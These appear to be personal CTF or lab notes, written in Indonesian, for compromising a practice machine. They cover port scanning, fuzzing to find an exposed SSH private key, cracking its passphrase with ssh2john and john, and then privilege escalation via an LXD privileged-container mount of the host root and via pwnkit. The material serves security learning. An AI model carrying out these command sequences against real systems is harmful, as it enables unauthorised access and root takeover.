# boot:
1. scan nmap 22 80 kebuka -> next fuzz
2. ada dir robot yang ada /upload disitu ada wordlist ambil aja dict.ls itu
3. next di fuzz ada /secret isinya rsa priv key 
4. next di halaman utama di source code ada pesan buat john jadi usernya mungkin john
5. ssh -i rsa john@ip -> butuh passphrase -> ssh2john rsa > rsa.hash -> john rsa.hash --wordlist=dist.ls.tadi
6. gas ssh kesana chmod 600 jan lupa 
7. klaim flag

# pe:
1. di /opt gada bash history gada di linpeas ada sih pwnkit tapi ada di vuln lxd
2. download aja https://github.com/saghul/lxd-alpine-builder 
3. wget yang zip itu dari python server -> terus gini
4. lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
5. lxc image list -> kek docker kah ini
6. lxc init myimage ignite -c security.privileged=true
7. lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
8. lxc start ignite
9. lxc exec ignite /bin/bash
10. dan akhirnya gagal dan aku pakai pwnkit
11. klaim root
